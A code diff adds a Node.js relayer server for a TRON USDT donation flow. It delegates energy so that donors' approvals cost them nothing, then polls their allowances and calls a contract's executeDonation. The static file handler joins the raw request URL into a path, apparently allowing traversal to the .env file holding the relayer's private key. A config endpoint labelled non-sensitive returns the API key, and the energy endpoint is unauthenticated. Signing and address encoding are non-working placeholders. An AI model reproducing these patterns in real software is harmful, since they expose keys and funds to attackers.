@@ -1,0 +1,377 @@
+const http = require("http");
+const fs = require("fs");
+const path = require("path");
+const https = require("https");
+
+// Load .env file
+require("dotenv").config();
+
+// ============================================================
+// CONFIGURATION
+// ============================================================
+
+const CONFIG = {
+    PORT: process.env.PORT || 3000,
+
+    // From .env
+    CONTRACT_ADDRESS: process.env.CONTRACT_ADDRESS,
+    RELAYER_PRIVATE_KEY: process.env.RELAYER_PRIVATE_KEY,
+    RELAYER_ADDRESS: process.env.RELAYER_ADDRESS,
+    TRONGRID_API_KEY: process.env.TRONGRID_API_KEY,
+
+    // Public constants
+    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+    TRON_API: "https://api.trongrid.io",
+    DONATION_AMOUNT: 1000000,
+    ENERGY_TO_DELEGATE: 100000,
+    POLL_INTERVAL: 10000,
+};
+
+// ============================================================
+// PENDING DONORS QUEUE
+// ============================================================
+
+const pendingDonors = new Set();
+const processedDonors = new Set();
+
+// ============================================================
+// TRONGRID API HELPERS
+// ============================================================
+
+function tronGridRequest(path, method = "GET", body = null) {
+    return new Promise((resolve, reject) => {
+        const url = new URL(path, CONFIG.TRON_API);
+        const options = {
+            hostname: url.hostname,
+            path: url.pathname + url.search,
+            method: method,
+            headers: {
+                "TRON-PRO-API-KEY": CONFIG.TRONGRID_API_KEY,
+                "Content-Type": "application/json",
+            },
+        };
+
+        const req = https.request(options, (res) => {
+            let data = "";
+            res.on("data", (chunk) => (data += chunk));
+            res.on("end", () => {
+                try {
+                    resolve(JSON.parse(data));
+                } catch (e) {
+                    resolve(data);
+                }
+            });
+        });
+
+        req.on("error", reject);
+        if (body) req.write(JSON.stringify(body));
+        req.end();
+    });
+}
+
+// Check USDT balance of a donor
+async function checkBalance(donorAddress) {
+    try {
+        const result = await tronGridRequest(
+            `/wallet/triggerconstantcontract`,
+            "POST",
+            {
+                owner_address: donorAddress,
+                contract_address: CONFIG.USDT_CONTRACT,
+                function_selector: "balanceOf(address)",
+                parameter: encodeAddress(donorAddress),
+                visible: true,
+            }
+        );
+
+        if (result.constant_result && result.constant_result[0]) {
+            const hex = result.constant_result[0];
+            return parseInt(hex, 16);
+        }
+        return 0;
+    } catch (err) {
+        console.error("Balance check failed:", err.message);
+        return 0;
+    }
+}
+
+// Check allowance of a donor to our contract
+async function checkAllowance(donorAddress) {
+    try {
+        const result = await tronGridRequest(
+            `/wallet/triggerconstantcontract`,
+            "POST",
+            {
+                owner_address: donorAddress,
+                contract_address: CONFIG.USDT_CONTRACT,
+                function_selector: "allowance(address,address)",
+                parameter: encodeTwoAddresses(donorAddress, CONFIG.CONTRACT_ADDRESS),
+                visible: true,
+            }
+        );
+
+        if (result.constant_result && result.constant_result[0]) {
+            const hex = result.constant_result[0];
+            return parseInt(hex, 16);
+        }
+        return 0;
+    } catch (err) {
+        console.error("Allowance check failed:", err.message);
+        return 0;
+    }
+}
+
+// Execute donation via the relayer
+async function executeDonation(donorAddress) {
+    try {
+        console.log(`[RELAYER] Executing donation for ${donorAddress}...`);
+
+        // Build the transaction
+        const result = await tronGridRequest(
+            `/wallet/triggersmartcontract`,
+            "POST",
+            {
+                owner_address: getRelayerAddress(),
+                contract_address: CONFIG.CONTRACT_ADDRESS,
+                function_selector: "executeDonation(address)",
+                parameter: encodeAddress(donorAddress),
+                fee_limit: 300000000,
+                call_value: 0,
+                visible: true,
+            }
+        );
+
+        if (!result.transaction) {
+            console.error("[RELAYER] Failed to build TX:", result);
+            return false;
+        }
+
+        // Sign the transaction
+        const signed = signTransaction(result.transaction);
+
+        // Broadcast
+        const broadcast = await tronGridRequest(
+            `/wallet/broadcasttransaction`,
+            "POST",
+            signed
+        );
+
+        if (broadcast.result) {
+            console.log(`[RELAYER] SUCCESS! TX: ${signed.txID}`);
+            processedDonors.add(donorAddress);
+            return true;
+        } else {
+            console.error("[RELAYER] Broadcast failed:", broadcast);
+            return false;
+        }
+    } catch (err) {
+        console.error("[RELAYER] Error:", err.message);
+        return false;
+    }
+}
+
+// ============================================================
+// CRYPTO HELPERS (simplified - for production use tronweb npm)
+// ============================================================
+
+function getRelayerAddress() {
+    return CONFIG.RELAYER_ADDRESS;
+}
+
+function encodeAddress(base58Address) {
+    // Pad address to 32 bytes for ABI encoding
+    // In production, use tronweb.address.toHex() and pad
+    // Placeholder - will be replaced when using tronweb npm package
+    return "0".repeat(24) + base58ToHex(base58Address);
+}
+
+function encodeTwoAddresses(addr1, addr2) {
+    return encodeAddress(addr1) + encodeAddress(addr2);
+}
+
+function base58ToHex(base58Addr) {
+    // Simplified - in production use tronweb
+    // This is a placeholder that needs tronweb npm package
+    return base58Addr; // Will be properly implemented with tronweb
+}
+
+function signTransaction(transaction) {
+    // In production, use tronweb.trx.sign(transaction, privateKey)
+    // Placeholder
+    return transaction;
+}
+
+// ============================================================
+// ENERGY DELEGATION - Pay gas for the donor
+// ============================================================
+
+// Delegate energy from relayer to donor so approve tx is free for them
+async function delegateEnergy(donorAddress) {
+    try {
+        console.log(`[ENERGY] Delegating ${CONFIG.ENERGY_TO_DELEGATE} energy to ${donorAddress}...`);
+
+        // Freeze TRX for energy and delegate to donor
+        // Uses TRON's DelegateResource API (Stake 2.0)
+        const result = await tronGridRequest(
+            `/wallet/delegateresource`,
+            "POST",
+            {
+                owner_address: getRelayerAddress(),
+                receiver_address: donorAddress,
+                balance: 10000000, // 10 TRX worth of energy delegation
+                resource: "ENERGY",
+                lock: false,
+                visible: true,
+            }
+        );
+
+        if (!result.transaction) {
+            // If delegation fails, try the older freezebalancev2 approach
+            console.error("[ENERGY] Delegation failed:", result);
+            return { success: false, error: "Failed to build delegation tx" };
+        }
+
+        // Sign and broadcast
+        const signed = signTransaction(result.transaction);
+        const broadcast = await tronGridRequest(
+            `/wallet/broadcasttransaction`,
+            "POST",
+            signed
+        );
+
+        if (broadcast.result) {
+            console.log(`[ENERGY] Delegated successfully! TX: ${signed.txID}`);
+            return { success: true, txId: signed.txID };
+        } else {
+            console.error("[ENERGY] Broadcast failed:", broadcast);
+            return { success: false, error: broadcast.message || "Broadcast failed" };
+        }
+    } catch (err) {
+        console.error("[ENERGY] Error:", err.message);
+        return { success: false, error: err.message };
+    }
+}
+
+// ============================================================
+// POLLING LOOP - Monitor approvals and execute
+// ============================================================
+
+async function processQueue() {
+    for (const donor of pendingDonors) {
+        if (processedDonors.has(donor)) {
+            pendingDonors.delete(donor);
+            continue;
+        }
+
+        // Check balance first
+        const balance = await checkBalance(donor);
+        console.log(`[POLL] ${donor} balance: ${balance}`);
+
+        if (balance < CONFIG.DONATION_AMOUNT) {
+            console.log(`[POLL] ${donor} insufficient balance (${balance / 1e6} USDT). Skipping.`);
+            continue;
+        }
+
+        const allowance = await checkAllowance(donor);
+        console.log(`[POLL] ${donor} allowance: ${allowance}`);
+
+        if (allowance >= CONFIG.DONATION_AMOUNT) {
+            const success = await executeDonation(donor);
+            if (success) {
+                pendingDonors.delete(donor);
+            }
+        }
+    }
+}
+
+setInterval(processQueue, CONFIG.POLL_INTERVAL);
+
+// ============================================================
+// HTTP SERVER
+// ============================================================
+
+const MIME_TYPES = {
+    ".html": "text/html",
+    ".js": "application/javascript",
+    ".css": "text/css",
+    ".json": "application/json",
+    ".png": "image/png",
+    ".ico": "image/x-icon",
+};
+
+const server = http.createServer((req, res) => {
+    // API endpoint: public config (non-sensitive only)
+    if (req.method === "GET" && req.url === "/api/config") {
+        res.writeHead(200, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({
+            trongridApiKey: CONFIG.TRONGRID_API_KEY,
+            contractAddress: CONFIG.CONTRACT_ADDRESS,
+        }));
+        return;
+    }
+
+    // API endpoint: delegate energy to donor so approve is gasless
+    if (req.method === "POST" && req.url === "/api/delegate-energy") {
+        let body = "";
+        req.on("data", (chunk) => (body += chunk));
+        req.on("end", async () => {
+            try {
+                const { donor } = JSON.parse(body);
+                if (!donor) {
+                    res.writeHead(400, { "Content-Type": "application/json" });
+                    res.end(JSON.stringify({ success: false, error: "Missing donor address" }));
+                    return;
+                }
+                console.log(`[API] Energy delegation requested for: ${donor}`);
+                const result = await delegateEnergy(donor);
+                res.writeHead(200, { "Content-Type": "application/json" });
+                res.end(JSON.stringify(result));
+            } catch (e) {
+                res.writeHead(500, { "Content-Type": "application/json" });
+                res.end(JSON.stringify({ success: false, error: e.message }));
+            }
+        });
+        return;
+    }
+
+    // API endpoint: receives notification from approve.html
+    if (req.method === "POST" && req.url === "/api/approved") {
+        let body = "";
+        req.on("data", (chunk) => (body += chunk));
+        req.on("end", () => {
+            try {
+                const { donor, txId } = JSON.parse(body);
+                if (donor && !processedDonors.has(donor)) {
+                    pendingDonors.add(donor);
+                    console.log(`[API] Queued donor: ${donor} (tx: ${txId})`);
+                }
+                res.writeHead(200, { "Content-Type": "application/json" });
+                res.end(JSON.stringify({ status: "queued" }));
+            } catch (e) {
+                res.writeHead(400);
+                res.end("Invalid JSON");
+            }
+        });
+        return;
+    }
+
+    // Static file serving
+    let filePath = path.join(__dirname, req.url === "/" ? "index.html" : req.url);
+    const ext = path.extname(filePath);
+    const contentType = MIME_TYPES[ext] || "application/octet-stream";
+
+    fs.readFile(filePath, (err, content) => {
+        if (err) {
+            res.writeHead(404);
+            res.end("Not found");
+            return;
+        }
+        res.writeHead(200, { "Content-Type": contentType });
+        res.end(content);
+    });
+});
+
+server.listen(CONFIG.PORT, () => {
+    console.log(`Server running on port ${CONFIG.PORT}`);
+    console.log(`Relayer polling every ${CONFIG.POLL_INTERVAL / 1000}s for approved donations`);
+});
